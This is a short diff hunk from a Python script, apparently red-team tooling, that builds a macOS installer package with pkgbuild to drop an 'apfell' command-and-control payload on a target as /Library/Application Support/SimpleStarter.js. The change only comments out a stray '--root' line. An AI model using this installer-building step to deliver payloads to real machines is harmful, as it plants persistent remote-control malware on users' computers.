@@ -68,7 +68,7 @@ def install_pkg_with_LD():
         os.system("pkgbuild --identifier com.apple.simple --nopayload --scripts ./Payloads/Installer_Package_with_LD_Payload/simple-package/scripts ./Payloads/Installer_Package_with_LD_Payload/simple_LD.pkg")
 
         # To add payload :
-             --root (optional): The path to the root directory for the installer payload.​
+             #--root (optional): The path to the root directory for the installer payload.​
         print("[+] Built simple_LD.pkg")
         print("Notes: \n"
               "1) This version saves the apfell payload on target as /Library/Application Support/SimpleStarter.js \n"
